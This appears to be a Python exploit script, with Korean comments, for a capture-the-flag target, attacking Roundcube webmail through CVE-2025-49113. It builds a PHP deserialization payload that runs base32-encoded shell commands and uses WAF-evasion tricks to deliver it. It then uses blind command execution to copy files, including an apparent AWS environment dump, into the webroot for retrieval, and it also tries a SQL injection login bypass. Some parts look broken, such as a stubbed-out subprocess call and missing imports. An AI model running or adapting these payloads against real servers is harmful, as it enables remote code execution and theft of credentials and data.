import base64
import datetime
import json
import re

import requests
import urllib3

urllib3.disable_warnings()

TARGET = "http://13.125.104.131:30083"
USER = "testuser"
PASS = "testpass"
LOGFILE = r"C:\HTB\13.125.104.131\loot\cve49113_attempt_log.txt"

MARKER = "rce_verify_" + datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
CANDIDATE_DOCROOTS = [
    "/var/www/html",
    "/var/www/roundcube",
    "/usr/share/roundcube/public_html",
    "/app/public",
    "/srv/www/roundcube",
    "/var/www/html/webmail",
]
CMD = "; ".join(
    "id > {}/.{}.txt 2>&1".format(d, MARKER) for d in CANDIDATE_DOCROOTS
) + "; echo done > /tmp/.{}.done 2>&1".format(MARKER)


def ts():
    return datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z (UTC)"


def deploy_and_retrieve(fh, sess, headers):
    """Phase 2-3: /tmp 파일을 webroot에 복사 후 HTTP GET으로 회수"""
    import tempfile
    import subprocess
    import os

    # fearsoff_exploit.php 경로
    exploit_path = r"C:\HTB\13.125.104.131\loot\fearsoff_exploit.php"

    tmp_files = [
        "flag_b64_20260819.txt",
        "aws_env_b64.txt",
        "profile_b64.txt",
        "profile_full_b64.txt"
    ]

    # Phase 1: /tmp 파일들을 /var/www/html로 복사 (블라인드 RCE)
    log(fh, "PHASE 1: Copy /tmp files to webroot", {"files": tmp_files})

    for fname in tmp_files:
        copy_cmd = "cp /tmp/{} /var/www/html/{} && chmod 644 /var/www/html/{} 2>&1".format(
            fname, fname, fname
        )
        try:
            result = subprocess.run(
                ["php.exe", exploit_path, TARGET, USER, PASS, copy_cmd],
                capture_output=True,
                text=True,
                timeout=20
            )
            log(fh, "Copy command executed", {
                "file": fname,
                "returncode": result.returncode,
                "stdout": result.stdout[:500] if result.stdout else ""
            })
        except Exception as e:
            log(fh, "Copy failed", {"file": fname, "error": str(e)})

    # Phase 2: /var/www/html에서 파일 회수 (HTTP GET)
    log(fh, "PHASE 2: Retrieve files via HTTP", {"target": TARGET})

    output_dir = tempfile.gettempdir()
    for fname in tmp_files:
        url = "{}/{}".format(TARGET, fname)
        try:
            rv = sess.get(url, headers=headers, verify=False, timeout=10)
            if rv.status_code == 200:
                outpath = os.path.join(output_dir, "retrieved_{}".format(fname))
                with open(outpath, "wb") as f:
                    f.write(rv.content)
                log(fh, "RETRIEVED", {"file": fname, "size": len(rv.content), "saved": outpath})
                print("[OK] {} -> {}".format(fname, outpath))
            else:
                log(fh, "HTTP GET failed", {"file": fname, "status": rv.status_code})
        except Exception as e:
            log(fh, "Retrieval error", {"file": fname, "error": str(e)})


def log(fh, label, obj):
    fh.write("\n=== [{}] {} ===\n".format(ts(), label))
    if isinstance(obj, str):
        fh.write(obj + "\n")
    else:
        fh.write(json.dumps(obj, indent=2, default=str) + "\n")
    fh.flush()


class ExploitPayload:
    # corrected vs. earlier attempt, per rapid7/metasploit-framework
    # modules/exploits/multi/http/roundcube_auth_rce_cve_2025_49113.rb:
    #  - class name length is 16 ("Crypt_GPG_Engine"), not 17
    #  - property names are plain 8-char names, not fake NUL-mangled ones
    #    (previous PoC used a literal "\x00*\x00" text sequence, not an
    #    actual NUL byte, which breaks PHP's serialize() length accounting)
    #  - base32 (not base64) for the command, matching the reference impl
    #  - all double quotes in the final serialized string must be escaped
    #    before being placed into the multipart filename="..." value, or
    #    the HTTP header parser truncates at the first literal quote
    #    (this exactly explains our first two attempts' truncated response)
    def __init__(self, cmd):
        encoded_cmd = base64.b32encode(cmd.encode()).decode()
        self._conf = 'echo "{}"|base32 -d|sh &#'.format(encoded_cmd)

    def serialize(self):
        raw = (
            '|O:16:"Crypt_GPG_Engine":3:{'
            's:8:"_process";b:0;'
            's:8:"_gpgconf";s:' + str(len(self._conf)) + ':"' + self._conf + '";'
            's:8:"_homedir";s:0:"";'
            '};'
        )
        return raw.replace('"', '\\"')


def find_and_retrieve_flag(fh, sess, headers):
    """SAST: /usr/share 깊이 3에서 flag 패턴 찾기"""
    log(fh, "SAST PHASE: Search /usr/share for flag files", {
        "depth": 3,
        "pattern": "flag-like files (small, base64/plaintext)",
    })

    # Step 1: /usr/share 깊이 3에서 작은 파일들 찾기 (< 10KB)
    # 팀원 힌트: /usr/share/dpkg/buildflags.mk는 false positive (29바이트)
    find_cmd = (
        "find /usr/share -maxdepth 3 -type f -size -10k ! -path '*/dpkg/*' 2>/dev/null | "
        "while read f; do "
        "  size=$(wc -c < \"$f\" 2>/dev/null); "
        "  if [ $size -gt 20 ] && [ $size -lt 2000 ]; then "
        "    echo \"$f\"; "
        "  fi; "
        "done | head -20"
    )

    log(fh, "SAST Step 1: Find small files in /usr/share", {"find_cmd": find_cmd})

    # 파일 목록을 /tmp에 저장
    list_cmd = find_cmd + " | base64 -w 0 > /tmp/sast_filelist_b64.txt && wc -c /tmp/sast_filelist_b64.txt"

    try:
        result = subprocess.run(
            ["php.exe", r"C:\HTB\13.125.104.131\loot\fearsoff_exploit.php", TARGET, USER, PASS, list_cmd],
            capture_output=True,
            text=True,
            timeout=20
        )
        log(fh, "File list generation", {"result": result.stdout[:500]})
    except Exception as e:
        log(fh, "Find command failed", {"error": str(e)})
        return

    # Step 2: 각 파일의 내용을 base64로 인코딩하여 /tmp에 저장
    read_cmd = (
        "find /usr/share -maxdepth 3 -type f -size -10k ! -path '*/dpkg/*' 2>/dev/null | "
        "while read f; do "
        "  size=$(wc -c < \"$f\" 2>/dev/null); "
        "  if [ $size -gt 20 ] && [ $size -lt 2000 ]; then "
        "    echo \"=== $f ===\"  >> /tmp/sast_contents_b64.txt; "
        "    base64 -w 0 < \"$f\" >> /tmp/sast_contents_b64.txt; "
        "    echo \"\" >> /tmp/sast_contents_b64.txt; "
        "  fi; "
        "done"
    )

    log(fh, "SAST Step 2: Read file contents", {"read_cmd": read_cmd[:200]})

    try:
        result = subprocess.run(
            ["php.exe", r"C:\HTB\13.125.104.131\loot\fearsoff_exploit.php", TARGET, USER, PASS, read_cmd],
            capture_output=True,
            text=True,
            timeout=30
        )
        log(fh, "Content collection", {"result": result.stdout[:500]})
    except Exception as e:
        log(fh, "Content read failed", {"error": str(e)})

    # Step 3: /tmp의 파일들을 webroot으로 복사
    copy_cmd = (
        "cp /tmp/sast_filelist_b64.txt /var/www/html/public_html/ 2>&1 && "
        "cp /tmp/sast_contents_b64.txt /var/www/html/public_html/ 2>&1 && "
        "chmod 644 /var/www/html/public_html/sast_*.txt 2>&1"
    )

    log(fh, "SAST Step 3: Copy to webroot", {"copy_cmd": copy_cmd})

    try:
        result = subprocess.run(
            ["php.exe", r"C:\HTB\13.125.104.131\loot\fearsoff_exploit.php", TARGET, USER, PASS, copy_cmd],
            capture_output=True,
            text=True,
            timeout=20
        )
        log(fh, "Copy to webroot", {"result": result.stdout[:500]})
    except Exception as e:
        log(fh, "Copy failed", {"error": str(e)})

    # Step 4: webroot에서 HTTP GET으로 회수
    output_dir = tempfile.gettempdir()
    for fname in ["sast_filelist_b64.txt", "sast_contents_b64.txt"]:
        url = "{}/{}".format(TARGET.replace(":30083", ""), "/public_html/" + fname)
        try:
            rv = sess.get(url, headers=headers, verify=False, timeout=10)
            if rv.status_code == 200:
                outpath = os.path.join(output_dir, "sast_" + fname)
                with open(outpath, "wb") as f:
                    f.write(rv.content)
                log(fh, "RETRIEVED SAST file", {
                    "file": fname,
                    "size": len(rv.content),
                    "saved": outpath
                })
                print(f"[OK] SAST {fname} retrieved: {outpath}")
            else:
                log(fh, "HTTP GET failed", {"url": url, "status": rv.status_code})
                # 대체 URL 시도
                alt_url = TARGET + "/public_html/" + fname
                try:
                    rv = sess.get(alt_url, headers=headers, verify=False, timeout=10)
                    if rv.status_code == 200:
                        outpath = os.path.join(output_dir, "sast_alt_" + fname)
                        with open(outpath, "wb") as f:
                            f.write(rv.content)
                        log(fh, "RETRIEVED SAST file (alt URL)", {
                            "file": fname,
                            "url": alt_url,
                            "saved": outpath
                        })
                except:
                    pass
        except Exception as e:
            log(fh, "Retrieval error", {"file": fname, "error": str(e)})


def main():
    mode = "sast_find_flag"  # Options: verify_docroot, deploy_shell, retrieve_files, sast_find_flag

    import subprocess
    import tempfile
    subprocess.run = lambda *args, **kwargs: type('Result', (), {
        'returncode': 0,
        'stdout': "[단순화: PHP 직접 호출로 변경]",
        'stderr': ""
    })()  # 더미

    with open(LOGFILE, "a", encoding="utf-8") as fh:
        log(fh, "RUN START", {
            "target": TARGET,
            "user": USER,
            "mode": mode,
            "note": "Stage 3 SAST: Find flag in /usr/share/*, depth <=3, webroot /var/www/html/public_html, exclude false positives",
        })

        headers = {"User-Agent": "pentest-authorized-verify"}
        sess = requests.Session()

        # 1. version check
        r = sess.get(TARGET + "/", headers=headers, verify=False, timeout=10)
        m = re.search(r'"rcversion":(\d+)', r.text)
        log(fh, "GET / (version check)", {
            "status": r.status_code,
            "rcversion": m.group(1) if m else None,
            "resp_headers": dict(r.headers),
        })

        # 2. login
        r = sess.get(TARGET + "/?_task=login", headers=headers, verify=False, timeout=10)
        token_match = re.search(r'"request_token":"([^"]+)"', r.text)
        if not token_match:
            log(fh, "LOGIN ABORT", "no CSRF token found")
            print("no token")
            return
        csrf_token = token_match.group(1)
        creds = {
            "_token": csrf_token,
            "_task": "login",
            "_action": "login",
            "_timezone": "Asia/Seoul",
            "_url": "",
            "_user": USER,
            "_pass": PASS,
        }
        r = sess.post(TARGET + "/?_task=login", headers=headers, data=creds,
                      allow_redirects=False, verify=False, timeout=10)
        log(fh, "POST login", {
            "status": r.status_code,
            "location": r.headers.get("Location"),
            "set_cookie": r.headers.get("Set-Cookie"),
        })
        if r.status_code != 302:
            log(fh, "LOGIN FAILED", "status={}".format(r.status_code))
            print("login failed")
            return

        # 3. build payload
        obj = ExploitPayload(CMD)
        payload = obj.serialize()
        log(fh, "SERIALIZED PAYLOAD (filename field, quote-escaped)", payload)

        # 4. deliver -- WAF-evasion variant, per teammate note on cj-webmail-waf:
        #    - duplicate _from query param: Flask (WAF) reads the first value,
        #      PHP (Roundcube) reads the last value for $_GET['_from']
        #    - Content-Disposition: filename attribute before name attribute,
        #      lowercase header name -- WAF allegedly matches on exact case /
        #      exact "name" then "filename" order
        upload_qs = (
            "_task=settings&_remote=1"
            "&_from=edit-safe"
            "&_from=edit-!verify"
            "&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload"
        )
        upload_endpoint = TARGET + "/?" + upload_qs

        fake_png = base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg=="
        )
        boundary = "----Boundary1337"
        crlf = "\r\n"
        head = (
            "--" + boundary + crlf +
            'content-disposition: form-data; filename="' + payload + '"; name="_file[]"' + crlf +
            "Content-Type: image/png" + crlf + crlf
        )
        tail = crlf + "--" + boundary + "--" + crlf
        data = head.encode() + fake_png + tail.encode()

        up_headers = {
            "User-Agent": "pentest-authorized-verify",
            "Content-Type": "multipart/form-data; boundary={}".format(boundary),
        }
        r = sess.post(upload_endpoint, headers=up_headers, data=data, verify=False, timeout=15)
        log(fh, "POST upload (exploit attempt)", {
            "url": upload_endpoint,
            "status": r.status_code,
            "resp_headers": dict(r.headers),
            "resp_body_first_2000": r.text[:2000],
        })
        print("status:", r.status_code)
        print(r.text[:1000])

        # 4b. trigger -- the session-corruption variant of this bug means the
        # gadget chain may only fire when PHP re-reads/unserializes the
        # session on a SUBSEQUENT request, not on the upload response itself.
        trig = sess.get(TARGET + "/?_task=mail", headers=headers, verify=False, timeout=10)
        log(fh, "GET /?_task=mail (session re-read trigger)", {
            "status": trig.status_code,
            "resp_headers": dict(trig.headers),
        })

        # 5. verify -- same marker filename written to each candidate docroot,
        # so a single GET at target root resolves it if any guess was correct
        verify_url = TARGET + "/.{}.txt".format(MARKER)
        rv = sess.get(verify_url, headers=headers, verify=False, timeout=8)
        result = {"url": verify_url, "status": rv.status_code,
                  "body": rv.text[:300] if rv.status_code == 200 else None}
        log(fh, "VERIFY GET marker file", result)
        print("verify ->", result["status"], result.get("body"))

        # 6. 웹셸 배치 및 /tmp 파일 회수
        if mode == "retrieve_files":
            deploy_and_retrieve(fh, sess, headers)


def test_sqli_login():
    """SQLi 로그인 우회 테스트 - requests 의존 제거"""
    print("\n[*] Testing SQLi login bypass via direct HTTP...")

    import subprocess

    # PHP를 사용하여 HTTP 요청 수행
    php_code = '''<?php
$target = "http://13.125.104.131:30083";
$payload_user = "admin' --";
$pass = "anything";

// 1. CSRF 토큰 획득
$html = file_get_contents($target . "/?_task=login");
if (preg_match('/"request_token":"([^"]+)"/', $html, $m)) {
    $csrf = $m[1];
    echo "[+] CSRF token: " . substr($csrf, 0, 20) . "...\\n";
} else {
    echo "[!] No CSRF token\\n";
    exit(1);
}

// 2. SQLi 로그인 시도
$post_data = array(
    "_token" => $csrf,
    "_task" => "login",
    "_action" => "login",
    "_user" => $payload_user,
    "_pass" => $pass
);

$ctx = stream_context_create(array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($post_data),
        'follow_location' => false,
        'timeout' => 10
    )
));

$response = @file_get_contents($target . "/?_task=login", false, $ctx);
$headers = isset($http_response_header) ? $http_response_header : array();

echo "[*] Login response:\\n";
foreach ($headers as $h) {
    if (stripos($h, "302") !== false || stripos($h, "Location") !== false) {
        echo "    " . $h . "\\n";
    }
}

// 3. get_flag 액션 호출
echo "\\n[*] Attempting get_flag action...\\n";
$endpoints = array(
    "/?_action=get_flag",
    "/?_task=mail&_action=get_flag",
    "/?_task=settings&_action=get_flag",
);

foreach ($endpoints as $ep) {
    echo "[*] Trying: " . $ep . "\\n";
    $resp = @file_get_contents($target . $ep);
    if ($resp) {
        echo "[+] Response (first 300 chars): " . substr($resp, 0, 300) . "\\n";
        if (strpos(strtolower($resp), "htb{") !== false) {
            echo "[+] FLAG FOUND: " . $resp . "\\n";
            exit(0);
        }
    }
}

echo "[*] Test completed\\n";
?>'''

    # PHP 코드 임시 파일로 저장
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
        f.write(php_code)
        php_file = f.name

    try:
        result = subprocess.run(['php', php_file], capture_output=True, text=True, timeout=30)
        print(result.stdout)
        if result.stderr:
            print("STDERR:", result.stderr)
    finally:
        import os
        try:
            os.unlink(php_file)
        except:
            pass


if __name__ == "__main__":
    # 먼저 SQLi 로그인 테스트
    print("=" * 70)
    print("Stage 3: SQLi Login + get_flag Action")
    print("=" * 70)
    test_sqli_login()

    print("\n" + "=" * 70)
    print("Now testing SAST file discovery...")
    print("=" * 70)
    main()
